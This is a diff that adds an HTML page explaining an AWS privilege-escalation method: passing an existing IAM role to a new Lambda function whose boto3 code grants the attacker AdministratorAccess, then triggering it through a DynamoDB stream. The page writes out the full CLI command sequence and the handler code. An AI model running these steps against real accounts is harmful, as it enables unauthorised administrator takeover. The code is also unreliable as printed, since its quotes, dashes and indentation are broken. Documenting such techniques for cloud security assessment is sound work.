@@ -1,0 +1,33 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Passing a Role to a New Lamdda Function and Triggering</title>
+</head><body><b>Description: </b>A user with the <u>iam:PassRole</u>, <u>lambda:CreateFunction</u>, and <u>lambda:CreateEventSourceMapping</u>&nbsp;(and possibly <u>dynamodb:PutItem</u>&nbsp;and <u>dynamodb:CreateTable</u>) permissions, but without the <u>lambda:InvokeFunction</u>&nbsp;permission, can escalate privileges by passing an existing IAM role to a new Lambda function that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice. They then would need to either create a DynamoDB table or use an existing one, to create an event source mapping for the Lambda function pointing to that DynamoDB table. Then they would need to either put an item into the table or wait for another method to do so that the Lambda function will be invoked.<br/>
+&nbsp;<br/>
+An example set of commands to exploit this method might look like this:<br/>
+<i>aws lambda create-function –function-name my_function –runtime python3.6 –role arn_of_lambda_role –handler lambda_function.lambda_handler –code file://my/python/code.py</i><br/>
+&nbsp;<br/>
+Where the code in the python file would utilize the targeted role. An example would be the same script used in method 11’s description:<br/>
+<br/>
+import boto3<br/>
+def lambda_handler(event, context):<br/>
+&nbsp; &nbsp; client = boto3.client(‘iam’)<br/>
+&nbsp; &nbsp; response = client.attach_user_policy(UserName=’my_username’, PolicyArn=’ arn:aws:iam::aws:policy/AdministratorAccess’)<br/>
+<br/>
+return response<br/>
+<br/>
+&nbsp;<br/>
+After this, the next step depends on whether DynamoDB is being used in the current AWS environment. If it is being used, all that needs to be done is creating the event source mapping for the Lambda function, but if not, then the attacker will need to create a table with streaming enabled with the following command:<br/>
+<i>aws dynamodb create-table –table-name my_table –attribute-definitions AttributeName=Test,AttributeType=S –key-schema AttributeName=Test,KeyType=HASH –provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 –stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES</i><br/>
+&nbsp;<br/>
+After this command, the attacker would connect the Lambda function and the DynamoDB table by creating an event source mapping with the following command:<br/>
+<i>aws lambda create-event-source-mapping –function-name my_function –event-source-arn arn_of_dynamodb_table_stream –enabled –starting-position LATEST</i><br/>
+&nbsp;<br/>
+Now that the Lambda function and the stream are connected, the attacker can invoke the Lambda function by triggering the DynamoDB stream. This can be done by putting an item into the DynamoDB table, which will trigger the stream, using the following command:<br/>
+<i>aws dynamodb put-item –table-name my_table –item Test={S=”Random string”}</i><br/>
+&nbsp;<br/>
+At this point, the Lambda function will be invoked, and the attacker will be made an administrator of the AWS account.<br/>
+&nbsp;<br/>
+<b>Potential Impact: </b>This would give an attacker access to the privileges associated with any Lambda service role that exists in the account, which could range from no privilege escalation to full administrator access to the account.<br/>
+&nbsp; &nbsp;</body></html>
